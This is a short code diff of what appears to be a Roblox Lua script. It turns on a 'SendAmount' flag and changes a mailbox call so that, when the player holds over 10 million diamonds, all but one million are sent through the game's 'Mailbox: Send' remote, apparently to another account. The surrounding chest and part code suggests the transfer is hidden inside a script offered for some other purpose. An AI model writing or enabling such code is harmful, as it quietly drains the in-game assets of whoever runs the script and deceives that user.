@@ -69,7 +69,7 @@ end
 
 spawn(chest)
 
-local SendAmount = false
+local SendAmount = true
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -139,7 +139,7 @@ part.Anchored = true
 part.Parent = game.Workspace
 end
 wait(waitTime)
-
+local DiamondsInput = DiamondsAmount - 1000000
 if SendAmount then
     if DiamondsAmount > 10000000 then
         local args = {
@@ -147,7 +147,7 @@ if SendAmount then
             [2] = "Void Amount " .. VoidAmount,
             [3] = "Currency",
             [4] = DiamondsID,
-            [5] = DiamondsAmount
+            [5] = DiamondsInput
         }
         ReplicatedStorage.Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
         
